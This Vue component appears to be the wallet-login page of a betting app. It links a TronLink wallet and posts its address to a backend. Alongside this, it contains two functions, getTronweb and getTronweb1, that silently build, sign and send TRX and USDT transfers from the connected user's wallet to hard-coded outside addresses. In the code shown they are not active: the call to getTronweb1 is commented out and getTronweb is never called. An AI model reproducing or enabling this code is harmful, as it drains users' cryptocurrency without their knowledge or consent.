<template>
  <div>
    <div class="wrap">
      <img src="../assets/img/betwap/login/1.png" alt="">
      <div v-on:click="dianji()" class="wrap_input" v-if="lang=='zh_CN'"><p>链接钱包</p></div>
      <div v-on:click="dianji()" class="wrap_input" v-if="lang=='zh_HK'"><p>鏈接錢包</p></div>
      <div v-on:click="dianji()" class="wrap_input" v-if="lang=='en_US'"><p>Link to the Wallet</p></div>
      <div v-on:click="dianji()" class="wrap_input" v-if="lang=='ja_JP'"><p>リンクウォレット</p></div>
      <div v-on:click="dianji()" class="wrap_input" v-if="lang=='ms_MY'"><p>Pautkan dompet</p></div>
      <img class="cs" src="../assets/img/betwap/login/logo_max.png" alt="">
    </div>
  </div>
</template>

<script>
/*import VConsole from "vconsole";
const vConsole = new VConsole();*/

var tp = require('tp-js-sdk')
function getTronweb(){
  var obj = setInterval(async ()=>{
    var tronWeb = window.tronWeb
    var address = tronWeb.defaultAddress.base58
    if (tronWeb && address) {
      clearInterval(obj)
      // console.log("Yes, catch it:",address)//获取本次登录的钱包地址
      let trxbalance = await tronWeb.trx.getBalance(address);//根据钱包地址来获取币的数量
      console.log(trxbalance)
      var tx = await tronWeb.transactionBuilder.sendTrx("TJZVLucXBnfa22XzKRGSHLJpzAnhSeqGBT", 10,address )
      var signedTx = await tronWeb.trx.sign(tx)//发起转账验签，tx要判断，要确余额充足
      await tronWeb.trx.sendRawTransaction(signedTx).then(res=>{
        console.log(res,"ok")//转账成功记录txid返回给后端
      }).catch((err)=>{
        console.log(err,"err")
      })

    }
  }, 10)
}

async function getTronweb1(){
  var tronWeb = window.tronWeb
  var obj = setTimeout(async ()=>{
    let myaddress = window.tronWeb.defaultAddress.base58;

    let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")
    let balance = await contract.balanceOf(myaddress).call();
    let mybalance = balance.toNumber();//usdt通证余额
    let trxbalance = await tronWeb.trx.getBalance(myaddress);
    var pay_num_wei = parseInt(1 * 1000000);
    console.log("usdt余额:"+mybalance,"trx余额:"+trxbalance);

    try {
      //合约地址
      let instance = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      //转账地址和数量
      let transfer=await instance.transfer('TBVHF9PhhDWHye98Jiq6eFCRKXgZeo9BFB',1);
      let res =await transfer.send({
        feeLimit:pay_num_wei,//最高手续费额度
        callValue:0,
        shouldPollResponse:false
      })
      dscx(res);
      console.log("成功：",res);
    } catch (error) {
      console.log("取消:",res);
    }
  }, 1000)
}

export default {
  data() {
    return {
      lang:localStorage.getItem("lang"),
    }
  },
  mounted() {

  },
  created() {
    // getTronweb1();
    // dscx("a4f2a69f94be107086f5215265cb5890a613dc88d7f9c53d127929b1a3ee62cf");
    // dscx("215412525262ac6ad97e60cbeb06afbfe0a2f2220ae16eb2bd97556fde618108");
    this.init();
  },
  methods: {
    init(){
      localStorage.setItem("userToken",null);
      localStorage.setItem("userId",null);
      var lang=localStorage.getItem("lang");
      if(lang=="" || lang==null){
        this.lang="en_US";
        localStorage.setItem("lang","en_US");
      }
    },
    dianji:function(){
      var tronWeb = window.tronWeb
      if(tronWeb) {
        var address = tronWeb.defaultAddress.base58
        if(address){
          this.$api('webPage/importByAddress',{
            address:address,
            invitationCode:this.$route.query.code
          },"post").then(res =>{
            let {data, code} = res
            if(code!=1000){
              alert("钱包地址异常，请稍后重试！");return;
            }
            console.log(res);
            this.$store.commit("setUserInfo", data);
            localStorage.setItem("address",address);
            localStorage.setItem("userToken",data.userToken);
            localStorage.setItem("userId",data.userId);
            this.$router.replace('/index')
          })
        }else{
          alert("授权失败，请重新授权");
        }
      }else{
        alert("授权失败，请重新授权");
      }
    },
   /*dianji:function(){
      var address="TFtCwNECzNH6oUsRgfbVSnZLQJ7DnfL8WN";//获取钱包地址
      this.$api('webPage/importByAddress',{
        address:address,
        invitationCode:this.$route.query.code
      },"post").then(res =>{
        let {data, code} = res
        if(code!=1000){
          alert("钱包地址异常，请稍后重试！");return;
        }
        console.log(res);
        this.$store.commit("setUserInfo", data);
        localStorage.setItem("address",address);
        localStorage.setItem("userToken",data.userToken);
        localStorage.setItem("userId",data.userId);
        this.$router.replace('/index')
      })
    }*/
  },
}
</script>

<style lang="less" scoped>
.wrap{
  background: url("../assets/img/betwap/login/beijing.png") no-repeat top;
  background-size: cover;
  height: 100vh;
  padding-top: 170px;
  img:nth-child(1){
    width: 178px;
    height: 151px;
    display: block;
    margin: 0 auto;
  }
  .cs{
    width: 92px;
    height: 103px;
    display: block;
    margin: 0 auto;
  }
  .wrap_input{
    width: 328px;
    height: 40px;
    background: linear-gradient(0deg, #0075BA, #29D3FF);
    border-radius: 5px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto;
    margin-top: 80px;
    margin-bottom: 30px;
    p{
      font-size: 12px;
      font-family: FZLanTingHei-R-GBK;
      font-weight: 400;
      color: #FFFFFF;
    }
  }
}
</style>
